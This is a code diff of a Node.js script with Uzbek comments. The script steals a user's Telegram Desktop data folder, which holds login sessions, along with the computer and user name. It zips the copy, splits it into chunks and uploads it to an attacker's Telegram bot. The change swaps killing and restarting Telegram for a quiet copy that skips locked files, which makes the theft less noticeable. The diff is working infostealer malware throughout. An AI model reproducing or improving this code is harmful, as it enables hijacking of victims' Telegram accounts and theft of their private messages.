@@ -12,7 +12,6 @@ const FOLDER_PATH = "C:\\Users\\User\\AppData\\Roaming\\Telegram Desktop";
 const CHUNK_SIZE = 49 * 1024 * 1024;
 // =======================
 
-// Barcha kutilmagan xatolarni ushlash
 process.on("uncaughtException", (err) => {
   sendMessage(`❌ Kutilmagan xato:\n${err.message}\n\nStack: ${err.stack}`, () => process.exit(1));
 });
@@ -21,7 +20,6 @@ process.on("unhandledRejection", (reason) => {
   sendMessage(`❌ Unhandled rejection:\n${reason}`, () => process.exit(1));
 });
 
-// Kompyuter haqida ma'lumot
 const pcInfo = [
   `Kompyuter: ${os.hostname()}`,
   `Foydalanuvchi: ${os.userInfo().username}`,
@@ -41,9 +39,9 @@ if (!fs.existsSync(folderPath) || !fs.statSync(folderPath).isDirectory()) {
 
 function start() {
   const folderName = path.basename(path.resolve(folderPath));
+  const tempCopyPath = path.join(os.tmpdir(), `${folderName}_copy`);
   const zipPath = path.join(os.tmpdir(), `${folderName}.zip`);
 
-  // Papka hajmini hisoblash
   let folderSize = 0;
   try {
     folderSize = getFolderSize(folderPath);
@@ -57,18 +55,46 @@ function start() {
   const zipLevel = isSmall ? 9 : 1;
 
   sendMessage(`🟢 Yangi foydalanuvchi run qildi!\n\n${pcInfo}\n\nPapka: ${folderName}\nHajmi: ${folderSizeMB} MB`, () => {
-    // Telegramni o'chirish
-    const { execSync } = require("child_process");
-    try {
-      execSync("taskkill /F /IM Telegram.exe", { stdio: "ignore" });
-    } catch (e) {}
+    sendMessage(`📋 Papka copy qilinyapti...`, () => {
+      // Temp copy papkasini tozalash (eski qolgan bo'lsa)
+      try { deleteFolderRecursive(tempCopyPath); } catch (e) {}
 
-    setTimeout(() => {
-      sendMessage(`📦 Zip qilinyapti: ${folderName} (${folderSizeMB} MB, level: ${zipLevel})...`, () => {
-        startZipping(folderName, zipPath, zipLevel);
+      let skipped = 0;
+      copyFolderRecursive(folderPath, tempCopyPath, (s) => { skipped = s; });
+
+      sendMessage(`📦 Zip qilinyapti (${skipped > 0 ? skipped + " fayl o'tkazib yuborildi" : "hammasi ko'chirildi"})...`, () => {
+        startZipping(folderName, tempCopyPath, zipPath, zipLevel);
       });
-    }, 2000);
+    });
   });
+}
+
+// Papkani rekursiv copy qilish, locklangan fayllarni o'tkazib yuborish
+function copyFolderRecursive(src, dest, onDone) {
+  let skipped = 0;
+  fs.mkdirSync(dest, { recursive: true });
+
+  const items = fs.readdirSync(src, { withFileTypes: true });
+  for (const item of items) {
+    const srcPath = path.join(src, item.name);
+    const destPath = path.join(dest, item.name);
+    try {
+      if (item.isDirectory()) {
+        skipped += copyFolderRecursive(srcPath, destPath, null) || 0;
+      } else {
+        fs.copyFileSync(srcPath, destPath);
+      }
+    } catch (e) {
+      skipped++;
+    }
+  }
+  if (onDone) onDone(skipped);
+  return skipped;
+}
+
+function deleteFolderRecursive(dirPath) {
+  if (!fs.existsSync(dirPath)) return;
+  fs.rmSync(dirPath, { recursive: true, force: true });
 }
 
 function getFolderSize(dir) {
@@ -77,21 +103,21 @@ function getFolderSize(dir) {
   for (const item of items) {
     const fullPath = path.join(dir, item.name);
     try {
-      if (item.isDirectory()) {
-        size += getFolderSize(fullPath);
-      } else {
-        size += fs.statSync(fullPath).size;
-      }
+      if (item.isDirectory()) size += getFolderSize(fullPath);
+      else size += fs.statSync(fullPath).size;
     } catch (e) {}
   }
   return size;
 }
 
-function startZipping(folderName, zipPath, zipLevel) {
+function startZipping(folderName, sourcePath, zipPath, zipLevel) {
   const output = fs.createWriteStream(zipPath);
   const archive = archiver("zip", { zlib: { level: zipLevel } });
 
   output.on("close", () => {
+    // Temp copy ni o'chirish
+    try { deleteFolderRecursive(sourcePath); } catch (e) {}
+
     let totalSize;
     try {
       totalSize = fs.statSync(zipPath).size;
@@ -106,7 +132,6 @@ function startZipping(folderName, zipPath, zipLevel) {
         sendMessage(`📤 Yuborilmoqda: ${folderName}.zip (${sizeMB} MB)`, () => {
           sendFile(zipPath, `${folderName}.zip`, () => {
             try { fs.unlinkSync(zipPath); } catch (e) {}
-            restartTelegram();
             sendMessage(`✅ Tayyor! ${folderName}.zip yuborildi.`, () => {});
           });
         });
@@ -131,7 +156,7 @@ function startZipping(folderName, zipPath, zipLevel) {
   });
 
   archive.pipe(output);
-  archive.directory(folderPath, false);
+  archive.directory(sourcePath, false);
   archive.finalize();
 }
 
@@ -154,7 +179,6 @@ function splitAndSend(folderName, filePath, totalSize) {
     let index = 0;
     function sendNext() {
       if (index >= partPaths.length) {
-        restartTelegram();
         sendMessage(`✅ Tayyor! ${totalParts} ta bo'lak yuborildi.`, () => {});
         return;
       }
@@ -172,34 +196,14 @@ function splitAndSend(folderName, filePath, totalSize) {
   });
 }
 
-function restartTelegram() {
-  const { spawn } = require("child_process");
-  const possiblePaths = [
-    `${process.env.APPDATA}\\Telegram Desktop\\Telegram.exe`,
-    `${process.env.LOCALAPPDATA}\\Telegram Desktop\\Telegram.exe`,
-    "C:\\Program Files\\Telegram Desktop\\Telegram.exe",
-    "C:\\Program Files (x86)\\Telegram Desktop\\Telegram.exe",
-  ];
-  for (const p of possiblePaths) {
-    try {
-      if (fs.existsSync(p)) {
-        spawn(p, [], { detached: true, stdio: "ignore" }).unref();
-        return;
-      }
-    } catch (e) {}
-  }
-}
-
 function sendMessage(text, onDone) {
   const postData = JSON.stringify({ chat_id: CHAT_ID, text: text });
-
   const options = {
     hostname: "api.telegram.org",
     path: `/bot${BOT_TOKEN}/sendMessage`,
     method: "POST",
     headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) },
   };
-
   const req = https.request(options, (res) => {
     let data = "";
     res.on("data", (chunk) => (data += chunk));
@@ -215,14 +219,12 @@ function sendFile(filePath, fileName, onDone) {
   form.append("chat_id", CHAT_ID);
   form.append("caption", fileName);
   form.append("document", fs.createReadStream(filePath), { filename: fileName });
-
   const options = {
     hostname: "api.telegram.org",
     path: `/bot${BOT_TOKEN}/sendDocument`,
     method: "POST",
     headers: form.getHeaders(),
   };
-
   const req = https.request(options, (res) => {
     let data = "";
     res.on("data", (chunk) => (data += chunk));
